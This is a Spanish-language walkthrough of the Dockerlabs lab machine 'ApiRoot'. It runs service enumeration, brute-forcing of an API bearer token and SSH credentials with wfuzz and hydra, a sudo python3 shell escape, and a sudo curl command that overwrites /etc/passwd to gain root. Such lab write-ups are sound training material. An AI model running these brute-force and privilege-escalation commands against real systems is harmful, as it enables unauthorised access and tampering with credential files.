- Tags: #Api
# Writeup Template: Maquina `[ ApiRoot ]`

- Tags: #ApiRoot
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina ApiRoot](https://mega.nz/file/zIckAJDb#lfUZ5Y1LcEqndD9yXWDILpRMdWtnI9LX91uwqtPPYwQ) Laboratorio para aprender sobre vulnerabilidades en APIs y manipulación de datos.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x apiroot.zip
sudo bash auto_deploy.sh apiroot.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,5000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2:5000/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2:5000
http://172.17.0.2:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[¿Qué es una API?], Werkzeug[2.2.2]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p5000 172.17.0.2 # No reporta rutas 
```
### Descubrimiento de Rutas
```bash
gobuster dir --no-error -u http://172.17.0.2:5000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 --add-slash
```

**Hallazgos Relevantes:**
```bash
/console              (Status: 400) [Size: 167]
```

aunque no podemos ingresar a esta ruta:
```bash
# Bad Request
The browser (or proxy) sent a request that this server could not understand.
```

Realizando fuzzing para rutas:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u "http://172.17.0.2:5000/api/FUZZ" --hh=207
```

Tenemos lo siguiente:
```bash
000000202:   401        3 L      5 W        31 Ch       "users"
```

Ahora si apuntamos con **curl** nos retorna este mensaje:
```bash
curl -s -X GET -H "Authorization: Bearer password_secreta" http://172.17.0.2:5000/api/users
{
  "error": "No autorizado"
}
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que podemos enumerar la api, tenemos que descubrir la contrasena, asi que usaremo **wfuzz** para realizar ataque de fuerza bruta

### Ejecucion del Ataque
```bash
# Comandos para explotación
wfuzz --hh=31 -z file,/usr/share/wordlists/rockyou.txt -H "Authorization: Bearer FUZZ" http://172.17.0.2:5000/api/users
```

Tenemos lo siguiente, que parece una contrasena valida ahora lo que procede es usarla para ver que nos retorna
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000028:   200        10 L     14 W       89 Ch       "password1" 
```

Tenemos dos posibles usuarios en el sistema:
```bash
curl -H "Authorization: Bearer password1" http://172.17.0.2:5000/api/users
[
  {
    "id": 1,
    "nombre": "bob"
  },
  {
    "id": 2,
    "nombre": "dylan"
  }
]
```

Ahora para estos realizaremos fuerza bruta por **ssh**, Creamos un diccionario con esos dos nombres de usuarios:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://172.17.0.2
```

### Intrusion
Tenemos un usuario valido:
```bash
DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: bob   password: password1
```

Ahora nos conectamos por ssh
```bash
# Reverse shell o acceso inicial
ssh bob@172.17.0.2 # ( password1 )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracon usuarios del sistema
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```

###### Usuario `[ bob ]`:
Listando los permisos de este usuario:
```bash
sudo -l

User bob may run the following commands on efec34874b3a:
    (balulero) NOPASSWD: /usr/bin/python3
```

Ahora nos aprovechamos de esto para migrar al usuario **balulero**
```bash
sudo -u balulero /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

###### Usuario `[ balulero ]`:
Listando los permisos para este usuario
```bash
sudo -l

User balulero may run the following commands on efec34874b3a:
    (ALL) NOPASSWD: /usr/bin/curl
```

Lo que aremos es con el comando **cat** veremos el contendio del archivo: **/etc/passwd**, Despues copiamos y luego lo guardamos en el directorio **/tmp**
```bash
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```

Ahora nos provehcamos para sustituir el archivo original por el nuestro malicioso
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/curl file:///tmp/passwd -o /etc/passwd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1187  100  1187    0     0  11.4M      0 --:--:-- --:--:-- --:--:-- 11.4M
```

Ahora migramos a **root**
```bash
balulero@efec34874b3a:/tmp$ su root
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@efec34874b3a:/tmp# whoami
root
```